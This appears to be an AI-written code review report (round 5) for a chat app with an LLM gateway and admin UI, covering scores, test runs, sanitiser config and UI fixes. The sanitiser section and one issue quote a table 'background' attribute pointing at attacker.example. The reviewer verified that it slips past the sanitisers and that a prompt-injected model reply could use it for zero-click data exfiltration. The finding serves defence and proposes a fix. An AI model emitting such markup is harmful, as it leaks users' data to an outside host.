VERDICT: APPROVE
SCORE: 97/100 | Spec 24/25 · Correctness 24/25 · Tests 20/20 · Security 14/15 · CLAUDE.md 15/15
BLOCKERS: 0  MAJORS: 0  MINORS: 3

| Area | Max | Score | Deductions |
|---|---|---|---|
| Spec adherence | 25 | 24 | usage-page-sizes −1 |
| Correctness | 25 | 24 | dialog-cancel-during-save −1 |
| Tests | 20 | 20 | none |
| Security | 15 | 14 | md-remote-images (partly fixed: `background` attribute still fetches) −1 |
| CLAUDE.md rules | 15 | 15 | none |
| **Total** | 100 | **97** | |

Review round 5. Scope: everything in `git status --porcelain`. Files changed since review 4:
- `backend/src/services/llm-gateway.ts` and `backend/test/unit/llm-usage.test.ts`
- in `frontend/src/app`: `core/markdown(.spec).ts`, `shared/app-shell.component.ts`, `features/chat/chat.page.ts`, `features/chat/quota-panel.component.spec.ts`, and in `features/admin/`: `usage-tab`, `settings-tab`, `users-tab(.spec)`, `user-dialog(.spec)` and `admin-logic.spec`
- `tests/acceptance/ui-flows.spec.ts`, which QA changed at 20:00 (QA report-1 documents it; it is not an engineer edit)

I did not read `.env` or `test-results/ux/credentials.local.json`, and I did not run the acceptance suite.

## Test and lint run
- **`npm run lint` exits 0.** ESLint reports 0 errors and backend `tsc --noEmit` (app and migrations) is clean. The same 3 "unused eslint-disable" warnings come from generated `backend/coverage/lcov-report/*.js`, as before. Not scored.
- **`npm test`, first full run: 6 failures out of 118, all in `test/integration/admin.test.ts`.**
  - In the `beforeEach`, `makeUser` threw `EmailTakenError` on `user1@example.com` straight after the `TRUNCATE ... users`. One test also got `UNAUTHENTICATED` for a token that had just been issued.
  - Both symptoms point to a second process writing to the same `DATABASE_URL_TEST` at that moment: rows reappeared after the truncate, or the user was truncated away between login and request.
  - Neither `admin.test.ts` nor `test/helpers.ts` changed since review 3 (mtimes 15:28 and 15:32).
- **Re-runs both passed.**
  - `admin.test.ts` alone: 13 of 13 passed.
  - Full `npm test`: **backend 12 of 12 suites, 118 of 118 tests passed** (+2, the new cost-artifact cases; perf `quota.check p95 = 4.9 ms`), and **frontend Karma 88 of 88 passed** (+16). Exit 0.
- **Judgement:** environment contention on the shared test DB, not a code defect. Not scored. If it happens again, give the test DB an isolation guard (for example, a `pg_advisory_lock` held for the whole Jest run in `globalSetup`) and open `test-db-concurrent-use`.
- **`ng build`** (output to the scratchpad): initial total **506.64 kB**, which is 6.64 kB over the 500 kB warning budget. That is 0.01 kB smaller than in review 4, so it has not got worse. My earlier judgement stands (advisory, no deduction).

## Focus 1: `llm-gateway.ts` integrity (pass)
I read all 149 lines.
- **No duplicates or leftovers.** There is exactly one each of `ChatMessage`, `UsageResult`, `ChatHandle`, `LlmGateway`, `LlmError`, `usageSchema`, `parseUsage`, `MODEL_CACHE_TTL_MS`, `LiteLlmGateway` and `errMessage`. There are no orphan braces, unused imports or dead branches, and `tsc` and ESLint are clean.
- **Path A is intact.**
  - The call is `stream: true` with `stream_options: { include_usage: true }`. `usage` is captured from the chunk that carries it (the final one), and `parseUsage(usage, callId)` runs only after the stream ends (`:120-135`).
  - When `cost` is missing or empty, `parseUsage` throws `LlmError` (`:52-54`). The error is rejected and rethrown through `deltas` (`:136-141`), so the chat service persists nothing (Q4, unchanged).
  - The amount is `costRaw = String(cost)` → `Decimal` → `toMoneyString` HALF_UP to 6 dp. It is never `parseFloat`, and there is no app-side pricing and no `/spend/calculate`.
  - `maxRetries: 0` is kept (no double billing). The `x-litellm-call-id` capture is kept. Logs include model, callId and error message only: no prompt, no key.
- The stale `TODO(T-2 gate UNVERIFIED)` is replaced by the Path A comment at `:104-105`, worded as I asked in review 4.

## Focus 2: dialog save callback (pass, one minor)
- **`UserDialogComponent.submit()`** (`user-dialog.component.ts:115-132`):
  - **Double submit:** it returns early on `form.invalid || busy()`, and Save is `[disabled]="form.invalid || busy()"` with a spinner, so there is no double submit.
  - **Success:** the dialog closes only on resolve. A `false` return keeps it open with no error.
  - **Errors:** a throw goes to `showError`, and the typed values stay in the form.
- **409** (`:134-146`):
  - On create only, it sets a `server` error on Email, shows a `mat-error` with the server message (falling back to "A user with this email already exists"), marks the field touched and focuses Email.
  - The next edit to the email clears the error, because the validators rerun and replace `setErrors`.
  - Any other error shows in the inline `role="alert"` (`data-testid="user-form-error"`). This includes the server's AC-28 self-demotion refusal, which can only come from a crafted request since the UI locks the role.
- **"Remove admin" confirm inside the callback** (`users-tab.component.ts:198-213`):
  - `buildUserPatch` runs first. An empty patch closes without a request.
  - ADMIN→USER opens the `ConfirmDialogComponent` stacked on the edit dialog. Declining returns `false`, so the edit dialog stays open and no PATCH is sent. Confirming sends the PATCH and shows the snackbar.
  - Self rows can never produce `patch.role` (AC-28). Deactivate keeps its confirm and toggle restore (AC-27).
- **Create:** the callback calls `createUser`. The snackbar and reload happen only when `afterClosed` returns a result. Focus then returns by user id via `restoreFocus`, which uses `CSS.escape` and skips when focus is already on a live element.
- **Tests:**
  - `user-dialog.component.spec.ts` covers close-on-success, 409 inline with data kept, other errors inline, and `false` keeps the dialog open.
  - `users-tab.component.spec.ts` covers deactivate decline/confirm, reactivate with no confirm, demote cancel/confirm, a non-demoting edit, and contextual aria labels.
- **Gap (`dialog-cancel-during-save`):** while `busy()` is true, Cancel (`:82`), Esc and the backdrop still close the dialog. If the admin cancels while the request is in flight and it then succeeds, the user is created or updated, but `afterClosed` has already emitted `undefined`. As a result:
  - there is no reload, so the list is stale until the next action;
  - on create there is no snackbar;
  - on edit, the snackbar fires inside the callback after the dialog has closed.

## Focus 3: paging and sorting (pass, one minor)
- **Order:** `filteredUsers` → `sortedUsers` → `pagedUsers` (`usage-tab.component.ts:280-282`), so the sort covers the whole filtered list before `pageSlice` (`:56-60`).
  - `pageSlice` clamps an index past the end.
  - Changing the filter or the sort resets to page 0 (`:300-308`).
  - Money and percentage columns compare with `compareDecimal` on strings (no floats). Remaining is clamped at 0 on the server (`usage-report-service.ts:63`), so there are no negative strings to mis-order.
- **AC-25 holds:**
  - The default is `matSortActive="usedUsd"` / `desc`, the same as the `sort` signal's initial value.
  - The API order is unchanged, and the acceptance test checks API order.
  - The `user-usage-table` and `daily-table` testids are kept. `jump-daily` scrolls to and focuses the Daily heading.
- **Tests:** `admin-logic.spec.ts` "usage paging" tests sort-before-slice (60 rows, page 0 starts at "User 59", page 2 has 10 rows), the past-end clamp, and the filter.
- **Deviation (`usage-page-sizes`):** `USAGE_PAGE_SIZES = [10, 25, 50]` (`:31`), but ui-design §7.1 specifies options 25/50/100 (the default 25 is correct).

## Focus 4: DOMPurify config (mostly pass, residual minor)
- `FORBID_TAGS` now also covers img, picture, source, video, audio, track, iframe, embed, object and link. `FORBID_ATTR` covers style, src, srcset and poster. `USE_PROFILES: { html: true }` still drops SVG and MathML.
- The `afterSanitizeAttributes` hook still forces `target="_blank"` and `rel="noopener noreferrer"`. There is still no `bypassSecurityTrust*` anywhere.
- Links still render: the new "keeps ordinary links and text" test checks `href="https://example.com"`, and the `rel` test still passes.
- The new test checks that Markdown and raw-HTML images leave no `<img>`, no attacker host and no `src`/`srcset`.
- **Residual gap: the `background` attribute.** I checked this in headless Chrome with DOMPurify 3.4.17 and the exact config from `markdown.ts:29-33`:
  - The input `<table background="https://attacker.example/?q=secret"><tr><td background="...">` comes out of the sanitiser unchanged.
  - `background` is in DOMPurify's default HTML attribute allow-list and passes its URI check. Angular's sanitiser also keeps it (it is in `URI_ATTRS`, and `https:` is a safe URL).
  - When I put that HTML into a page with `innerHTML`, Chrome fetched `https://attacker.example/?q=secret` with no user action.
  - `marked` passes raw HTML through, so a prompt-injected reply can still use this as a zero-click exfiltration channel. `ping` and `<input type=image>` are stripped, and SVG `<image>` is dropped.

## Focus 5: Settings Save and bundle (unchanged)
- Settings Save is still `[disabled]="form.invalid || busy()"` with the `submit()` guard (`settings-tab.component.ts:79,121`). D-2 is still pending with the user, and this is not scored.
- The only change in this file is `subscriptSizing="dynamic"` plus 8 px gaps (`ui-forms`).
- The bundle is 506.64 kB (see the test run section). Advisory, as before.

## Other audit-2 fixes I checked in code
- **`ux-lock-aria`:** `[attr.aria-hidden]="false"` with `role="img"` on the focusable lock, and the toggle has `aria-describedby` pointing at a visually hidden hint.
- **`ux-action-names`:** "Edit <name>" and "Reset password for <name>".
- **`ux-dialog-focus-return`:** `restoreFocus` runs after create, edit, reset and toggle.
- **`ui-block-banner`:** `flex: none` at 24 px, and a "Blocked until …" tooltip on Send.
- **`ui-shell`:** on mobile the user name moves into the ⋮ menu as a disabled first item.
- **`ux-date-format`:** `APP_DATE_FORMATS` (2-digit day, short month) with the `en-GB` locale.
- **`ui-responsive-admin`:** the Date column is `nowrap` with a 96 px minimum width, and name and email stack on mobile.
- **`ui-forms`:** dynamic subscripts, and the short override hint "Empty = default quota. Up to 6 decimals".

## Issues
- [usage-page-sizes] frontend/src/app/features/admin/usage-tab.component.ts:31 — minor — ui-design §7.1 specifies page-size options 25/50/100. Change `USAGE_PAGE_SIZES` to `[25, 50, 100]`; the default 25 stays.
- [dialog-cancel-during-save] frontend/src/app/features/admin/user-dialog.component.ts:82 (with :123-131) — minor — While `busy()` is true, Cancel, Esc and the backdrop can close the dialog after the request has gone out, so a successful create or update leaves the list stale and skips the snackbar. Fix:
  - set `this.ref.disableClose = true` while busy and restore it in `finally`;
  - bind `[disabled]="busy()"` on Cancel;
  - add a spec that cancel is blocked while `save` is pending.
- [md-remote-images] frontend/src/app/core/markdown.ts:32 — minor — Partly fixed: images and media are gone, but `<table|td|th background="https://…">` still survives both sanitisers, and Chrome fetches it on render (verified). Fix:
  - add `'background'` to `FORBID_ATTR`;
  - add a `markdown.spec.ts` case asserting that `<table background="https://attacker.example/x"><tr><td background="https://attacker.example/y">a</td></tr></table>` comes out with no `background` and no `attacker.example`.

## Resolved since last review
- `t2-gate-todo-stale`: the Path A comment is at `llm-gateway.ts:104-105`.
- `cost-float-artifact-untested`: `llm-usage.test.ts:11-20` asserts `5.999999999999999e-6` → `0.000006` / raw `0.000005999999999999999`, and `4e-8` → `0.000000` / raw `4e-8`.
- `user-dialog-closes-on-server-error`: the save runs inside the dialog through a callback, the dialog stays open on error, and a 409 shows inline on Email.
- `quota-pct-unasserted`: `quota-panel.component.spec.ts:36-37,88` asserts "87.65% left", "98.77% left" and "· 87.65%".
- `confirm-dialog-untested`: `users-tab.component.spec.ts` covers deactivate decline/confirm, reactivate, and demote cancel/confirm.
- No older key has recurred: `stream-survives-logout`, `chat-store-not-reset-on-logout`, `integration-tests-not-run` and `routes-bypass-service-layer` are all still fixed.

## Open items carried from the spec (unchanged)
- Provisional Q3 to Q6 in spec §9 still need user confirmation.
- D-2 (Settings Save enabled or disabled on invalid input) is still for the user to decide.
